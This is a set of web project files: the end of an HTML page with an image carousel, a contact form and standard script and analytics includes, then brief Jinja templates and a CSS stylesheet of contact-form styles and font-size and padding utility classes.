                        <!--                            <img src="..." class="d-block w-100" alt="...">-->
                        <!--                        </div>-->
                        <!--                        <div class="carousel-item">-->
                        <!--                            <img src="..." class="d-block w-100" alt="...">-->
                        <!--                        </div>-->
                    </div>

                    <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
                        <span class="carousel-control-prev-icon" aria-hidden="true"></span>
                        <span class="sr-only">Previous</span>
                    </a>
                    <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
                        <span class="carousel-control-next-icon" aria-hidden="true"></span>
                        <span class="sr-only">Next</span>
                    </a>
                    <ol class="carousel-indicators position-static">
                        <li data-bs-target="#carouselExampleIndicators" data-bs-slide-to="0" class="active mySlider">
                            <img
                                    src="static/css/WhatsApp Image 2023-04-16 at 21.57.47.jpg"
                                    class="img-fluid rounded-circle">
                        </li>
                        <li data-bs-target="#carouselExampleIndicators" data-bs-slide-to="1" class="mySlider"><img
                                src="static/css/amira3.png" class="img-fluid rounded-circle"></li>
                        <li data-bs-target="#carouselExampleIndicators" data-bs-slide-to="2" class="mySlider"><img
                                src="static/css/raina.jpg" class="img-fluid rounded-circle"></li>
                        <li data-bs-target="#carouselExampleIndicators" data-bs-slide-to="3" class="mySlider"><img
                                src="static/css/YASMIN.png" class="img-fluid rounded-circle"></li>
                        <li data-bs-target="#carouselExampleIndicators" data-bs-slide-to="4" class="mySlider"><img
                                src="static/css/ghada.jpg" class="img-fluid rounded-circle"></li>
                    </ol>
                </div>
            </div>
        </div>
    </div>
</section>
<section class="vh-100" id="Contact">
    <div class="container-fluid text-center">
        <div class="row">
            <div class="col-lg-12">
                <h1>Contact US</h1>

                <div class="contact1">
                    <div class="container-contact1">
                        <div class="contact1-pic js-tilt" data-tilt>
                            <img src="static/css/images/img-01.png" alt="IMG">
                        </div>

                        <form class="contact1-form validate-form">
				<span class="contact1-form-title">
					Get in touch
				</span>

                            <div class="wrap-input1 validate-input" data-validate="Name is required">
                                <input class="input1" type="text" name="name" placeholder="Name">
                                <span class="shadow-input1"></span>
                            </div>

                            <div class="wrap-input1 validate-input" data-validate="Valid email is required: ex@abc.xyz">
                                <input class="input1" type="text" name="email" placeholder="Email">
                                <span class="shadow-input1"></span>
                            </div>

                            <div class="wrap-input1 validate-input" data-validate="Subject is required">
                                <input class="input1" type="text" name="subject" placeholder="Subject">
                                <span class="shadow-input1"></span>
                            </div>

                            <div class="wrap-input1 validate-input" data-validate="Message is required">
                                <textarea class="input1" name="message" placeholder="Message"></textarea>
                                <span class="shadow-input1"></span>
                            </div>

                            <div class="container-contact1-form-btn">
                                <button class="contact1-form-btn">
						<span>
							Send Email
							<i class="fa fa-long-arrow-right" aria-hidden="true"></i>
						</span>
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>


<!--===============================================================================================-->

<script src="static/css/js/main2.js"></script>
<!--===============================================================================================-->
<script src="static/css/vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
<script src="static/css/vendor/bootstrap/js/popper.js"></script>
<script src="static/css/vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
<script src="static/css/vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
<script src="static/css/vendor/tilt/tilt.jquery.min.js"></script>
<script>
		$('.js-tilt').tilt({
			scale: 1.1
		})







</script>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-23581568-13"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-23581568-13');







</script>
<script src="static/js/main.js"></script>
<script src="static/bootstrap-5.0.2-dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>

{%for i in files%}

<a href="">{{i}}</a>
{%endfor%}{%extends "base.html"%}
{%block content%}
{%endblock%}

    
    
    
    
    /*//////////////////////////////////////////////////////////////////
    [ FONT ]*/
    
    @font-face {
      font-family: Montserrat-Regular;
      src: url('../fonts/montserrat/Montserrat-Regular.ttf'); 
    }
    
    @font-face {
      font-family: Montserrat-Bold;
      src: url('../fonts/montserrat/Montserrat-Bold.ttf'); 
    }
    
    @font-face {
      font-family: Montserrat-ExtraBold;
      src: url('../fonts/montserrat/Montserrat-ExtraBold.ttf'); 
    }
    
    @font-face {
      font-family: Montserrat-Medium;
      src: url('../fonts/montserrat/Montserrat-Medium.ttf'); 
    }
    
    
    
    /*//////////////////////////////////////////////////////////////////
    [ RESTYLE TAG ]*/
    
    * {
        margin: 0px; 
        padding: 0px; 
        box-sizing: border-box;
    }
    
    
    
    /*---------------------------------------------*/
    a {
        font-family: Montserrat-Regular;
        font-size: 14px;
        line-height: 1.7;
        color: #666666;
        margin: 0px;
        transition: all 0.4s;
        -webkit-transition: all 0.4s;
      -o-transition: all 0.4s;
      -moz-transition: all 0.4s;
    }
    
    a:focus {
        outline: none !important;
    }
    
    a:hover {
        text-decoration: none;
        color: #57b846;
    }
    
    /*---------------------------------------------*/
    h1,h2,h3,h4,h5,h6 {
        margin: 0px;
    }
    
    /*p {
        font-family: Montserrat-Regular;
        font-size: 14px;
        line-height: 1.7;
        color: #666666;
        margin: 0px;
    }*/
    
    ul, li {
        margin: 0px;
        list-style-type: none;
    }
    
    
    /*---------------------------------------------*/
    input {
        outline: none;
        border: none;
    }
    
    textarea {
      outline: none;
      border: none;
    }
    
    textarea:focus, input:focus {
      border-color: transparent !important;
    }
    
    input::-webkit-input-placeholder { color: #999999; }
    input:-moz-placeholder { color: #999999; }
    input::-moz-placeholder { color: #999999; }
    input:-ms-input-placeholder { color: #999999; }
    
    textarea::-webkit-input-placeholder { color: #999999; }
    textarea:-moz-placeholder { color: #999999; }
    textarea::-moz-placeholder { color: #999999; }
    textarea:-ms-input-placeholder { color: #999999; }
    
    /*---------------------------------------------*/
    button {
        outline: none !important;
        border: none;
        background: transparent;
    }
    
    button:hover {
        cursor: pointer;
    }
    
    iframe {
        border: none !important;
    }
    
    
    
    
    /*//////////////////////////////////////////////////////////////////
    [ Contact 1 ]*/
    
    .contact1 {
      width: 100%;
      min-height: 100%;
      padding: 15px;
    
      /*background: #009bff;
      background: -webkit-linear-gradient(left, #0072ff, #00c6ff);
      background: -o-linear-gradient(left, #0072ff, #00c6ff);
      background: -moz-linear-gradient(left, #0072ff, #00c6ff);
      background: linear-gradient(left, #0072ff, #00c6ff);*/
    
      display: -webkit-box;
      display: -webkit-flex;
      display: -moz-box;
      display: -ms-flexbox;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: center;
    }
    
    .container-contact1 {
      width: 1163px;
      background: #fff;
      border-radius: 10px;
      overflow: hidden;
    
      display: -webkit-box;
      display: -webkit-flex;
      display: -moz-box;
      display: -ms-flexbox;
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      align-items: center;
    
      padding: 90px 130px 88px 148px;
    }
    
    /*------------------------------------------------------------------
    [  ]*/
    .contact1-pic {
      width: 296px;
    }
    
    .contact1-pic img {
      max-width: 100%;
    }
    
    
    /*------------------------------------------------------------------
    [  ]*/
    .contact1-form {
      width: 390px;
    }
    
    .contact1-form-title {
      display: block;
      font-family: Montserrat-ExtraBold;
      font-size: 24px;
      color: #333333;
      line-height: 1.2;
      text-align: center;
      padding-bottom: 44px;
    }
    
    input.input1 {
      height: 50px;
      border-radius: 25px;
      padding: 0 30px;
    }
    input.input1 + .shadow-input1 {
      border-radius: 25px;
    }
    
    textarea.input1 {
      min-height: 150px;
      border-radius: 25px;
      padding: 12px 30px;
    }
    textarea.input1 + .shadow-input1 {
      border-radius: 25px;
    }
    
    /*---------------------------------------------*/
    .wrap-input1 {
      position: relative;
      width: 100%;
      z-index: 1;
      margin-bottom: 20px;
    }
    
    .input1 {
      display: block;
      width: 100%;
      background: #e6e6e6;
      font-family: Montserrat-Bold;
      font-size: 15px;
      line-height: 1.5;
      color: #666666;
    }
    
    .shadow-input1 {
      content: '';
      display: block;
      position: absolute;
      bottom: 0;
      left: 0;
      z-index: -1;
      width: 100%;
      height: 100%;
      box-shadow: 0px 0px 0px 0px;
      color: rgba(87,184,70, 0.5);
    }
    
    .input1:focus + .shadow-input1 {
      -webkit-animation: anim-shadow 0.5s ease-in-out forwards;
      animation: anim-shadow 0.5s ease-in-out forwards;
    }
    
    @-webkit-keyframes anim-shadow {
      to {
        box-shadow: 0px 0px 80px 30px;
        opacity: 0;
      }
    }
    
    @keyframes anim-shadow {
      to {
        box-shadow: 0px 0px 80px 30px;
        opacity: 0;
      }
    }
    
    /*---------------------------------------------*/
    .container-contact1-form-btn {
      display: -webkit-box;
      display: -webkit-flex;
      display: -moz-box;
      display: -ms-flexbox;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
    }
    
    .contact1-form-btn {
      min-width: 193px;
      height: 50px;
      border-radius: 25px;
      background: #57b846;
      font-family: Montserrat-Bold;
      font-size: 15px;
      line-height: 1.5;
      color: #fff;
      display: -webkit-box;
      display: -webkit-flex;
      display: -moz-box;
      display: -ms-flexbox;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 0 25px;
    
      -webkit-transition: all 0.4s;
      -o-transition: all 0.4s;
      -moz-transition: all 0.4s;
      transition: all 0.4s;
    }
    
    .contact1-form-btn i {
      margin-left: 7px;
    
      -webkit-transition: all 0.4s;
      -o-transition: all 0.4s;
      -moz-transition: all 0.4s;
      transition: all 0.4s;
    }
    
    .contact1-form-btn:hover {
      background: #333333;
    }
    
    .contact1-form-btn:hover i {
      -webkit-transform: translateX(10px);
      -moz-transform: translateX(10px);
      -ms-transform: translateX(10px);
      -o-transform: translateX(10px);
      transform: translateX(10px);
    }
    
    
    
    
    /*------------------------------------------------------------------
    [ Responsive ]*/
    
    @media (max-width: 1200px) {
      .contact1-pic {
        width: 33.5%;
      }
    
      .contact1-form {
        width: 44%;
      }
    }
    
    @media (max-width: 992px) {
      .container-contact1 {
        padding: 90px 80px 88px 90px;
      }
    
      .contact1-pic {
        width: 35%;
      }
    
      .contact1-form {
        width: 55%;
      }
    }
    
    @media (max-width: 768px) {
      .container-contact1 {
        padding: 90px 80px 88px 80px;
      }
    
      .contact1-pic {
        display: none;
      }
    
      .contact1-form {
        width: 100%;
      }
    }
    
    @media (max-width: 576px) {
      .container-contact1 {
        padding: 90px 15px 88px 15px;
      }
    }
    
    
    /*------------------------------------------------------------------
    [ Alert validate ]*/
    
    .validate-input {
      position: relative;
    }
    
    .alert-validate::before {
      content: attr(data-validate);
      position: absolute;
      max-width: 70%;
      background-color: white;
      border: 1px solid #c80000;
      border-radius: 13px;
      padding: 4px 25px 4px 10px;
      top: 50%;
      -webkit-transform: translateY(-50%);
      -moz-transform: translateY(-50%);
      -ms-transform: translateY(-50%);
      -o-transform: translateY(-50%);
      transform: translateY(-50%);
      right: 8px;
      pointer-events: none;
    
      font-family: Montserrat-Medium;
      color: #c80000;
      font-size: 13px;
      line-height: 1.4;
      text-align: left;
    
      visibility: hidden;
      opacity: 0;
    
      -webkit-transition: opacity 0.4s;
      -o-transition: opacity 0.4s;
      -moz-transition: opacity 0.4s;
      transition: opacity 0.4s;
    }
    
    .alert-validate::after {
      content: "\f06a";
      font-family: FontAwesome;
      display: block;
      position: absolute;
      color: #c80000;
      font-size: 15px;
      top: 50%;
      -webkit-transform: translateY(-50%);
      -moz-transform: translateY(-50%);
      -ms-transform: translateY(-50%);
      -o-transform: translateY(-50%);
      transform: translateY(-50%);
      right: 13px;
    }
    
    .alert-validate:hover:before {
      visibility: visible;
      opacity: 1;
    }
    
    @media (max-width: 992px) {
      .alert-validate::before {
        visibility: visible;
        opacity: 1;
      }
    }

    /*[ FONT SIZE ]
///////////////////////////////////////////////////////////
*/
.fs-1 {font-size: 1px;}
.fs-2 {font-size: 2px;}
.fs-3 {font-size: 3px;}
.fs-4 {font-size: 4px;}
.fs-5 {font-size: 5px;}
.fs-6 {font-size: 6px;}
.fs-7 {font-size: 7px;}
.fs-8 {font-size: 8px;}
.fs-9 {font-size: 9px;}
.fs-10 {font-size: 10px;}
.fs-11 {font-size: 11px;}
.fs-12 {font-size: 12px;}
.fs-13 {font-size: 13px;}
.fs-14 {font-size: 14px;}
.fs-15 {font-size: 15px;}
.fs-16 {font-size: 16px;}
.fs-17 {font-size: 17px;}
.fs-18 {font-size: 18px;}
.fs-19 {font-size: 19px;}
.fs-20 {font-size: 20px;}
.fs-21 {font-size: 21px;}
.fs-22 {font-size: 22px;}
.fs-23 {font-size: 23px;}
.fs-24 {font-size: 24px;}
.fs-25 {font-size: 25px;}
.fs-26 {font-size: 26px;}
.fs-27 {font-size: 27px;}
.fs-28 {font-size: 28px;}
.fs-29 {font-size: 29px;}
.fs-30 {font-size: 30px;}
.fs-31 {font-size: 31px;}
.fs-32 {font-size: 32px;}
.fs-33 {font-size: 33px;}
.fs-34 {font-size: 34px;}
.fs-35 {font-size: 35px;}
.fs-36 {font-size: 36px;}
.fs-37 {font-size: 37px;}
.fs-38 {font-size: 38px;}
.fs-39 {font-size: 39px;}
.fs-40 {font-size: 40px;}
.fs-41 {font-size: 41px;}
.fs-42 {font-size: 42px;}
.fs-43 {font-size: 43px;}
.fs-44 {font-size: 44px;}
.fs-45 {font-size: 45px;}
.fs-46 {font-size: 46px;}
.fs-47 {font-size: 47px;}
.fs-48 {font-size: 48px;}
.fs-49 {font-size: 49px;}
.fs-50 {font-size: 50px;}
.fs-51 {font-size: 51px;}
.fs-52 {font-size: 52px;}
.fs-53 {font-size: 53px;}
.fs-54 {font-size: 54px;}
.fs-55 {font-size: 55px;}
.fs-56 {font-size: 56px;}
.fs-57 {font-size: 57px;}
.fs-58 {font-size: 58px;}
.fs-59 {font-size: 59px;}
.fs-60 {font-size: 60px;}
.fs-61 {font-size: 61px;}
.fs-62 {font-size: 62px;}
.fs-63 {font-size: 63px;}
.fs-64 {font-size: 64px;}
.fs-65 {font-size: 65px;}
.fs-66 {font-size: 66px;}
.fs-67 {font-size: 67px;}
.fs-68 {font-size: 68px;}
.fs-69 {font-size: 69px;}
.fs-70 {font-size: 70px;}
.fs-71 {font-size: 71px;}
.fs-72 {font-size: 72px;}
.fs-73 {font-size: 73px;}
.fs-74 {font-size: 74px;}
.fs-75 {font-size: 75px;}
.fs-76 {font-size: 76px;}
.fs-77 {font-size: 77px;}
.fs-78 {font-size: 78px;}
.fs-79 {font-size: 79px;}
.fs-80 {font-size: 80px;}
.fs-81 {font-size: 81px;}
.fs-82 {font-size: 82px;}
.fs-83 {font-size: 83px;}
.fs-84 {font-size: 84px;}
.fs-85 {font-size: 85px;}
.fs-86 {font-size: 86px;}
.fs-87 {font-size: 87px;}
.fs-88 {font-size: 88px;}
.fs-89 {font-size: 89px;}
.fs-90 {font-size: 90px;}
.fs-91 {font-size: 91px;}
.fs-92 {font-size: 92px;}
.fs-93 {font-size: 93px;}
.fs-94 {font-size: 94px;}
.fs-95 {font-size: 95px;}
.fs-96 {font-size: 96px;}
.fs-97 {font-size: 97px;}
.fs-98 {font-size: 98px;}
.fs-99 {font-size: 99px;}
.fs-100 {font-size: 100px;}
.fs-101 {font-size: 101px;}
.fs-102 {font-size: 102px;}
.fs-103 {font-size: 103px;}
.fs-104 {font-size: 104px;}
.fs-105 {font-size: 105px;}
.fs-106 {font-size: 106px;}
.fs-107 {font-size: 107px;}
.fs-108 {font-size: 108px;}
.fs-109 {font-size: 109px;}
.fs-110 {font-size: 110px;}
.fs-111 {font-size: 111px;}
.fs-112 {font-size: 112px;}
.fs-113 {font-size: 113px;}
.fs-114 {font-size: 114px;}
.fs-115 {font-size: 115px;}
.fs-116 {font-size: 116px;}
.fs-117 {font-size: 117px;}
.fs-118 {font-size: 118px;}
.fs-119 {font-size: 119px;}
.fs-120 {font-size: 120px;}
.fs-121 {font-size: 121px;}
.fs-122 {font-size: 122px;}
.fs-123 {font-size: 123px;}
.fs-124 {font-size: 124px;}
.fs-125 {font-size: 125px;}
.fs-126 {font-size: 126px;}
.fs-127 {font-size: 127px;}
.fs-128 {font-size: 128px;}
.fs-129 {font-size: 129px;}
.fs-130 {font-size: 130px;}
.fs-131 {font-size: 131px;}
.fs-132 {font-size: 132px;}
.fs-133 {font-size: 133px;}
.fs-134 {font-size: 134px;}
.fs-135 {font-size: 135px;}
.fs-136 {font-size: 136px;}
.fs-137 {font-size: 137px;}
.fs-138 {font-size: 138px;}
.fs-139 {font-size: 139px;}
.fs-140 {font-size: 140px;}
.fs-141 {font-size: 141px;}
.fs-142 {font-size: 142px;}
.fs-143 {font-size: 143px;}
.fs-144 {font-size: 144px;}
.fs-145 {font-size: 145px;}
.fs-146 {font-size: 146px;}
.fs-147 {font-size: 147px;}
.fs-148 {font-size: 148px;}
.fs-149 {font-size: 149px;}
.fs-150 {font-size: 150px;}
.fs-151 {font-size: 151px;}
.fs-152 {font-size: 152px;}
.fs-153 {font-size: 153px;}
.fs-154 {font-size: 154px;}
.fs-155 {font-size: 155px;}
.fs-156 {font-size: 156px;}
.fs-157 {font-size: 157px;}
.fs-158 {font-size: 158px;}
.fs-159 {font-size: 159px;}
.fs-160 {font-size: 160px;}
.fs-161 {font-size: 161px;}
.fs-162 {font-size: 162px;}
.fs-163 {font-size: 163px;}
.fs-164 {font-size: 164px;}
.fs-165 {font-size: 165px;}
.fs-166 {font-size: 166px;}
.fs-167 {font-size: 167px;}
.fs-168 {font-size: 168px;}
.fs-169 {font-size: 169px;}
.fs-170 {font-size: 170px;}
.fs-171 {font-size: 171px;}
.fs-172 {font-size: 172px;}
.fs-173 {font-size: 173px;}
.fs-174 {font-size: 174px;}
.fs-175 {font-size: 175px;}
.fs-176 {font-size: 176px;}
.fs-177 {font-size: 177px;}
.fs-178 {font-size: 178px;}
.fs-179 {font-size: 179px;}
.fs-180 {font-size: 180px;}
.fs-181 {font-size: 181px;}
.fs-182 {font-size: 182px;}
.fs-183 {font-size: 183px;}
.fs-184 {font-size: 184px;}
.fs-185 {font-size: 185px;}
.fs-186 {font-size: 186px;}
.fs-187 {font-size: 187px;}
.fs-188 {font-size: 188px;}
.fs-189 {font-size: 189px;}
.fs-190 {font-size: 190px;}
.fs-191 {font-size: 191px;}
.fs-192 {font-size: 192px;}
.fs-193 {font-size: 193px;}
.fs-194 {font-size: 194px;}
.fs-195 {font-size: 195px;}
.fs-196 {font-size: 196px;}
.fs-197 {font-size: 197px;}
.fs-198 {font-size: 198px;}
.fs-199 {font-size: 199px;}
.fs-200 {font-size: 200px;}

/*[ PADDING ]
///////////////////////////////////////////////////////////
*/
.p-t-0 {padding-top: 0px;}
.p-t-1 {padding-top: 1px;}
.p-t-2 {padding-top: 2px;}
.p-t-3 {padding-top: 3px;}
.p-t-4 {padding-top: 4px;}
.p-t-5 {padding-top: 5px;}
.p-t-6 {padding-top: 6px;}
.p-t-7 {padding-top: 7px;}
.p-t-8 {padding-top: 8px;}
.p-t-9 {padding-top: 9px;}
.p-t-10 {padding-top: 10px;}
.p-t-11 {padding-top: 11px;}
.p-t-12 {padding-top: 12px;}
.p-t-13 {padding-top: 13px;}
.p-t-14 {padding-top: 14px;}
.p-t-15 {padding-top: 15px;}
.p-t-16 {padding-top: 16px;}
.p-t-17 {padding-top: 17px;}
.p-t-18 {padding-top: 18px;}
.p-t-19 {padding-top: 19px;}
.p-t-20 {padding-top: 20px;}
.p-t-21 {padding-top: 21px;}
.p-t-22 {padding-top: 22px;}
.p-t-23 {padding-top: 23px;}
.p-t-24 {padding-top: 24px;}
.p-t-25 {padding-top: 25px;}
.p-t-26 {padding-top: 26px;}
.p-t-27 {padding-top: 27px;}
.p-t-28 {padding-top: 28px;}
.p-t-29 {padding-top: 29px;}
.p-t-30 {padding-top: 30px;}
.p-t-31 {padding-top: 31px;}
.p-t-32 {padding-top: 32px;}
.p-t-33 {padding-top: 33px;}
.p-t-34 {padding-top: 34px;}
.p-t-35 {padding-top: 35px;}
.p-t-36 {padding-top: 36px;}
.p-t-37 {padding-top: 37px;}
.p-t-38 {padding-top: 38px;}
.p-t-39 {padding-top: 39px;}
.p-t-40 {padding-top: 40px;}
.p-t-41 {padding-top: 41px;}
.p-t-42 {padding-top: 42px;}
.p-t-43 {padding-top: 43px;}
.p-t-44 {padding-top: 44px;}
.p-t-45 {padding-top: 45px;}
.p-t-46 {padding-top: 46px;}
.p-t-47 {padding-top: 47px;}
.p-t-48 {padding-top: 48px;}
.p-t-49 {padding-top: 49px;}
.p-t-50 {padding-top: 50px;}
.p-t-51 {padding-top: 51px;}
.p-t-52 {padding-top: 52px;}
.p-t-53 {padding-top: 53px;}
.p-t-54 {padding-top: 54px;}
.p-t-55 {padding-top: 55px;}
.p-t-56 {padding-top: 56px;}
.p-t-57 {padding-top: 57px;}
.p-t-58 {padding-top: 58px;}
.p-t-59 {padding-top: 59px;}
.p-t-60 {padding-top: 60px;}
.p-t-61 {padding-top: 61px;}
.p-t-62 {padding-top: 62px;}
.p-t-63 {padding-top: 63px;}
.p-t-64 {padding-top: 64px;}
.p-t-65 {padding-top: 65px;}
.p-t-66 {padding-top: 66px;}
.p-t-67 {padding-top: 67px;}
.p-t-68 {padding-top: 68px;}
.p-t-69 {padding-top: 69px;}
.p-t-70 {padding-top: 70px;}
.p-t-71 {padding-top: 71px;}
.p-t-72 {padding-top: 72px;}
.p-t-73 {padding-top: 73px;}
.p-t-74 {padding-top: 74px;}
.p-t-75 {padding-top: 75px;}
.p-t-76 {padding-top: 76px;}
.p-t-77 {padding-top: 77px;}
.p-t-78 {padding-top: 78px;}
.p-t-79 {padding-top: 79px;}
.p-t-80 {padding-top: 80px;}
.p-t-81 {padding-top: 81px;}
.p-t-82 {padding-top: 82px;}
.p-t-83 {padding-top: 83px;}
.p-t-84 {padding-top: 84px;}
.p-t-85 {padding-top: 85px;}
.p-t-86 {padding-top: 86px;}
.p-t-87 {padding-top: 87px;}
.p-t-88 {padding-top: 88px;}
.p-t-89 {padding-top: 89px;}
.p-t-90 {padding-top: 90px;}
.p-t-91 {padding-top: 91px;}
.p-t-92 {padding-top: 92px;}
.p-t-93 {padding-top: 93px;}
.p-t-94 {padding-top: 94px;}
.p-t-95 {padding-top: 95px;}
.p-t-96 {padding-top: 96px;}
.p-t-97 {padding-top: 97px;}
.p-t-98 {padding-top: 98px;}
.p-t-99 {padding-top: 99px;}
.p-t-100 {padding-top: 100px;}
.p-t-101 {padding-top: 101px;}
.p-t-102 {padding-top: 102px;}
.p-t-103 {padding-top: 103px;}
.p-t-104 {padding-top: 104px;}
.p-t-105 {padding-top: 105px;}
.p-t-106 {padding-top: 106px;}
.p-t-107 {padding-top: 107px;}
.p-t-108 {padding-top: 108px;}
.p-t-109 {padding-top: 109px;}
.p-t-110 {padding-top: 110px;}
.p-t-111 {padding-top: 111px;}
.p-t-112 {padding-top: 112px;}
.p-t-113 {padding-top: 113px;}
.p-t-114 {padding-top: 114px;}
.p-t-115 {padding-top: 115px;}
.p-t-116 {padding-top: 116px;}
.p-t-117 {padding-top: 117px;}
.p-t-118 {padding-top: 118px;}
.p-t-119 {padding-top: 119px;}
.p-t-120 {padding-top: 120px;}
.p-t-121 {padding-top: 121px;}
.p-t-122 {padding-top: 122px;}
.p-t-123 {padding-top: 123px;}
.p-t-124 {padding-top: 124px;}
.p-t-125 {padding-top: 125px;}
.p-t-126 {padding-top: 126px;}
.p-t-127 {padding-top: 127px;}
.p-t-128 {padding-top: 128px;}
.p-t-129 {padding-top: 129px;}
.p-t-130 {padding-top: 130px;}
.p-t-131 {padding-top: 131px;}
.p-t-132 {padding-top: 132px;}
.p-t-133 {padding-top: 133px;}
.p-t-134 {padding-top: 134px;}
.p-t-135 {padding-top: 135px;}
.p-t-136 {padding-top: 136px;}
.p-t-137 {padding-top: 137px;}
.p-t-138 {padding-top: 138px;}
.p-t-139 {padding-top: 139px;}
.p-t-140 {padding-top: 140px;}
.p-t-141 {padding-top: 141px;}
.p-t-142 {padding-top: 142px;}
.p-t-143 {padding-top: 143px;}
.p-t-144 {padding-top: 144px;}
.p-t-145 {padding-top: 145px;}
.p-t-146 {padding-top: 146px;}
.p-t-147 {padding-top: 147px;}
.p-t-148 {padding-top: 148px;}
.p-t-149 {padding-top: 149px;}
.p-t-150 {padding-top: 150px;}
.p-t-151 {padding-top: 151px;}
.p-t-152 {padding-top: 152px;}
.p-t-153 {padding-top: 153px;}
.p-t-154 {padding-top: 154px;}
.p-t-155 {padding-top: 155px;}
.p-t-156 {padding-top: 156px;}
.p-t-157 {padding-top: 157px;}
.p-t-158 {padding-top: 158px;}
.p-t-159 {padding-top: 159px;}
.p-t-160 {padding-top: 160px;}
.p-t-161 {padding-top: 161px;}
.p-t-162 {padding-top: 162px;}
.p-t-163 {padding-top: 163px;}
.p-t-164 {padding-top: 164px;}
.p-t-165 {padding-top: 165px;}
.p-t-166 {padding-top: 166px;}
.p-t-167 {padding-top: 167px;}
.p-t-168 {padding-top: 168px;}
.p-t-169 {padding-top: 169px;}
.p-t-170 {padding-top: 170px;}
.p-t-171 {padding-top: 171px;}
.p-t-172 {padding-top: 172px;}
.p-t-173 {padding-top: 173px;}
.p-t-174 {padding-top: 174px;}
.p-t-175 {padding-top: 175px;}
.p-t-176 {padding-top: 176px;}
.p-t-177 {padding-top: 177px;}
.p-t-178 {padding-top: 178px;}
.p-t-179 {padding-top: 179px;}
.p-t-180 {padding-top: 180px;}
.p-t-181 {padding-top: 181px;}
.p-t-182 {padding-top: 182px;}
.p-t-183 {padding-top: 183px;}
.p-t-184 {padding-top: 184px;}
.p-t-185 {padding-top: 185px;}
.p-t-186 {padding-top: 186px;}
.p-t-187 {padding-top: 187px;}
.p-t-188 {padding-top: 188px;}
.p-t-189 {padding-top: 189px;}
.p-t-190 {padding-top: 190px;}
.p-t-191 {padding-top: 191px;}
.p-t-192 {padding-top: 192px;}
.p-t-193 {padding-top: 193px;}
.p-t-194 {padding-top: 194px;}
.p-t-195 {padding-top: 195px;}
.p-t-196 {padding-top: 196px;}
.p-t-197 {padding-top: 197px;}
.p-t-198 {padding-top: 198px;}
.p-t-199 {padding-top: 199px;}
.p-t-200 {padding-top: 200px;}
.p-t-201 {padding-top: 201px;}
.p-t-202 {padding-top: 202px;}
.p-t-203 {padding-top: 203px;}
.p-t-204 {padding-top: 204px;}
.p-t-205 {padding-top: 205px;}
.p-t-206 {padding-top: 206px;}
.p-t-207 {padding-top: 207px;}
.p-t-208 {padding-top: 208px;}
.p-t-209 {padding-top: 209px;}
.p-t-210 {padding-top: 210px;}
.p-t-211 {padding-top: 211px;}
.p-t-212 {padding-top: 212px;}
.p-t-213 {padding-top: 213px;}
.p-t-214 {padding-top: 214px;}
.p-t-215 {padding-top: 215px;}
.p-t-216 {padding-top: 216px;}
.p-t-217 {padding-top: 217px;}
.p-t-218 {padding-top: 218px;}
.p-t-219 {padding-top: 219px;}
.p-t-220 {padding-top: 220px;}
.p-t-221 {padding-top: 221px;}
.p-t-222 {padding-top: 222px;}
.p-t-223 {padding-top: 223px;}
.p-t-224 {padding-top: 224px;}
.p-t-225 {padding-top: 225px;}
.p-t-226 {padding-top: 226px;}
.p-t-227 {padding-top: 227px;}
.p-t-228 {padding-top: 228px;}
.p-t-229 {padding-top: 229px;}
.p-t-230 {padding-top: 230px;}
.p-t-231 {padding-top: 231px;}
.p-t-232 {padding-top: 232px;}
.p-t-233 {padding-top: 233px;}
.p-t-234 {padding-top: 234px;}
.p-t-235 {padding-top: 235px;}
.p-t-236 {padding-top: 236px;}
.p-t-237 {padding-top: 237px;}
.p-t-238 {padding-top: 238px;}
.p-t-239 {padding-top: 239px;}
.p-t-240 {padding-top: 240px;}
.p-t-241 {padding-top: 241px;}
.p-t-242 {padding-top: 242px;}
.p-t-243 {padding-top: 243px;}
.p-t-244 {padding-top: 244px;}
.p-t-245 {padding-top: 245px;}
.p-t-246 {padding-top: 246px;}
.p-t-247 {padding-top: 247px;}
.p-t-248 {padding-top: 248px;}
.p-t-249 {padding-top: 249px;}
.p-t-250 {padding-top: 250px;}
.p-b-0 {padding-bottom: 0px;}
.p-b-1 {padding-bottom: 1px;}
.p-b-2 {padding-bottom: 2px;}
.p-b-3 {padding-bottom: 3px;}
.p-b-4 {padding-bottom: 4px;}
.p-b-5 {padding-bottom: 5px;}
.p-b-6 {padding-bottom: 6px;}
.p-b-7 {padding-bottom: 7px;}
.p-b-8 {padding-bottom: 8px;}
.p-b-9 {padding-bottom: 9px;}
.p-b-10 {padding-bottom: 10px;}
.p-b-11 {padding-bottom: 11px;}
.p-b-12 {padding-bottom: 12px;}
.p-b-13 {padding-bottom: 13px;}
.p-b-14 {padding-bottom: 14px;}
.p-b-15 {padding-bottom: 15px;}
.p-b-16 {padding-bottom: 16px;}
.p-b-17 {padding-bottom: 17px;}
.p-b-18 {padding-bottom: 18px;}
.p-b-19 {padding-bottom: 19px;}
.p-b-20 {padding-bottom: 20px;}
.p-b-21 {padding-bottom: 21px;}
.p-b-22 {padding-bottom: 22px;}
.p-b-23 {padding-bottom: 23px;}
.p-b-24 {padding-bottom: 24px;}
.p-b-25 {padding-bottom: 25px;}
.p-b-26 {padding-bottom: 26px;}
.p-b-27 {padding-bottom: 27px;}
.p-b-28 {padding-bottom: 28px;}
.p-b-29 {padding-bottom: 29px;}
.p-b-30 {padding-bottom: 30px;}
.p-b-31 {padding-bottom: 31px;}
.p-b-32 {padding-bottom: 32px;}
.p-b-33 {padding-bottom: 33px;}
.p-b-34 {padding-bottom: 34px;}
.p-b-35 {padding-bottom: 35px;}
.p-b-36 {padding-bottom: 36px;}
.p-b-37 {padding-bottom: 37px;}
.p-b-38 {padding-bottom: 38px;}
.p-b-39 {padding-bottom: 39px;}
.p-b-40 {padding-bottom: 40px;}
